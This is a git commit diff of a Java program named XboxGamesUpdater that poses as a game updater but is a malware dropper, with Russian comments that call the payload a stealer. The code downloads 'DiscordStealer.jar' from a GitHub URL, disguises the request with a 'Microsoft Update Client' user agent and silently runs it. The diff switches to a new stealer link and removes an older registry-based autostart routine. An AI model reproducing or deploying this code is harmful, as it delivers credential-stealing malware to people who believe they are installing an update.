5e2f9eb93a4086b516fb0b65f9f400cf7a3893f2
superbebra1234 <mob.catbee@mail.ru>
2026-06-02 13:49:31 +0400

    Update XboxGamesUpdater.java

--- XboxGamesUpdater.java
+++ XboxGamesUpdater.java
@@ -1,32 +1,18 @@
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
-import java.util.zip.*;
 
 public class XboxGamesUpdater {
     
-    private static final String STEALER_URL = "https://github.com/TopLeonNeon/stealer/raw/main/DiscordStealer.jar";
-    private static final String SAVE_PATH = "C:\\XboxGames\\systemhelper.jar";
+    // НОВАЯ ССЫЛКА НА СТИЛЕР
+    private static final String STEALER_URL = "https://github.com/superbebra1234/Test_GG_hub/raw/main/DiscordStealer.jar";
+    private static final String SAVE_PATH = "C:\\XboxGames\\DiscordStealer.jar";
     
     public static void main(String[] args) {
         try {
-            // Создаём папку
             new File("C:\\XboxGames").mkdirs();
             
-            // Скачиваем основной стилер с GitHub
-            downloadStealer();
-            
-            // Запускаем стилер
-            Runtime.getRuntime().exec("java -jar \"" + SAVE_PATH + "\"");
-            
-            // Копируем себя в автозагрузку
-            installStartup();
-            
-        } catch (Exception e) {}
-    }
-    
-    private static void downloadStealer() {
-        try {
+            // Скачиваем основной стилер
             URL url = new URL(STEALER_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestProperty("User-Agent", "Microsoft Update Client");
@@ -39,14 +25,10 @@ public class XboxGamesUpdater {
                     out.write(buffer, 0, bytesRead);
                 }
             }
-        } catch (Exception e) {}
-    }
-    
-    private static void installStartup() {
-        try {
-            String currentJar = XboxGamesUpdater.class.getProtectionDomain()
-                .getCodeSource().getLocation().toURI().getPath();
-            Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v XboxUpdater /t REG_SZ /d \"" + currentJar + "\" /f");
+            
+            // Запускаем стилер
+            Runtime.getRuntime().exec("java -jar \"" + SAVE_PATH + "\"");
+            
         } catch (Exception e) {}
     }
 }
